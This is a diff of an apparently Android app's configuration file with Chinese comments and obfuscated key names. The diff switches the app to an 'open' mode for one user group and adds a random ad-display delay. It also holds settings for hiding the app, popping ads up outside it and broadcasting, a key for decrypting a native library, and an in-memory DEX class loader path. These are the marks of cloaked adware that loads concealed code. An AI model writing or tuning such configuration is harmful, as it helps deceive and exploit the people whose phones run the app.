@@ -5,7 +5,7 @@
   //admin 当天请求上限
   "gazelle_tim": "3600-60-10",
   //用户B(lle),用户A(open)
-  "gazelle_gos_s": "gaze",
+  "gazelle_gos_s": "open",
   // 是否上报日志
   "log_sta": true,
   // Facebook id
@@ -22,7 +22,8 @@
   //延迟显示开始时间单位毫秒
   //延迟显示结束时间单位毫秒 配置0 则取消延迟
   //广告最大显示时间单位秒
-  "dahlia_t": "30-30-60-8-16-80-500-800-40",
+  //随机延迟
+  "dahlia_t": "30-30-60-8-16-80-500-800-40-10",
   //动态增加日志必传埋点建议只在A配置中加用-分隔
   "dahlia_na": "",
   // 广告id 高价值长度等于9为pangle其他长度则为topon或者tradplus
@@ -36,7 +37,7 @@
   // 解密so的key
   "igloo_ks": "opl12is4jz4h5szb",
   // 隐藏/外弹/广播/文件开关
-  "igloo_name": "freshasg-plikz-google-bigo"
+  "igloo_name": "kijm-plikz-google-bigo"
 }
 
 // 配置A
@@ -47,13 +48,13 @@
   "dahlia_na": "",
   "gazelle_fbi": "3616318175247400",
   "gazelle_fbt": "3616318175247400",
-  "dahlia_t": "30-30-60-8-16-80-500-800-40",
+  "dahlia_t": "30-30-60-8-16-80-500-800-40-10",
   "dahlia_id_h": "981772962",
   "dahlia_idL": "981772963",
   "igl_dex_path": "dalvik.system.InMemoryDexClassLoader=java.lang.ClassLoader=l2oi4kz6m7aj8sg9",
   "types_str": "j.i",
   "igloo_ks": "opl12is4jz4h5szb",
-  "igloo_name": "freshasg-plikz-google-bigo"
+  "igloo_name": "kijm-plikz-google-bigo"
 }
 
 
